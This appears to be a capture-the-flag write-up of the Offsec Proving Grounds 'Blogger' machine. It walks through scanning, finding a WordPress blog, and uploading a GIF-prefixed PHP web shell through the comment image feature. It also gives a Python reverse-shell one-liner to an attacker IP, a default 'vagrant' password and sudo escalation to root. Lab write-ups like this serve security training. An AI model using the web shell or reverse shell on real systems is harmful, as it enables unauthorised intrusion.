---
title: "Proving grounds Play: Blogger"
layout: post
date: 2023-09-12 05:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 951d828f5ede9a00a80739bdacadd344 (RSA)
|   256 d7b452a2c8fab70ed1a8d070cd6b3690 (ECDSA)
|_  256 dff24f773344d593d77917455aa1368b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Blogger | Home
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web PORT: 80

![img](/assets/images/CTF/Pg-Play/Blogger/web.png)

## Fuzzing

### Directory Fuzzing

![img](/assets/images/CTF/Pg-Play/Blogger/dirf.png)

Upon visting the `/assets/` folder there are folder named `/assets/fonts/blog/` found in the directory.

![img](/assets/images/CTF/Pg-Play/Blogger/blogs.png)

There are blogs posted on that folder and upon clicking one of the links it redirects to the `http://blogger.thm/assets/fonts/blog/?p=29` URL. So in order to access the blogs we will have to make an entry in our `/etc/hosts` file.

The blog contents are now available to check and the CMS is wordpress for the blog page.

## Reverse Shell File Upload

Upon surfing through the blog post there is a feature where the user can upload images as comments for the blogs posts.

Upload a php reverse shell with `GIF89a;` to bypass the validation and upload the shell.

### Upload

```php
GIF89a;

<?php
system($_GET['cmd']);
?>
```

In response the uploaded shell file location will be shown.

## Remote Code Execution

```text
http://blogger.thm/assets/fonts/blog/wp-content/uploads/2023/09/rce-1694529533.8856.php?cmd=id
```

Check the python version running on the attacking machine and use the below python3 reverse shell to get reverse shell.

```py
export RHOST="192.168.45.0";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

**Initial Foothold Obtained**

![img](/assets/images/CTF/Pg-Play/Blogger/shell.png)

Swtich to user `vagrant` using `vagrant` as password.

## Privilege Escalation

Enumerate user `vagrant` permissions.

```sh
Matching Defaults entries for vagrant on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL
```

User is allowed to run all of the binaries with no password required.

Use `sudo su` to obtain root shell.

![img](/assets/images/CTF/Pg-Play/Blogger/root.png)

**Root obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).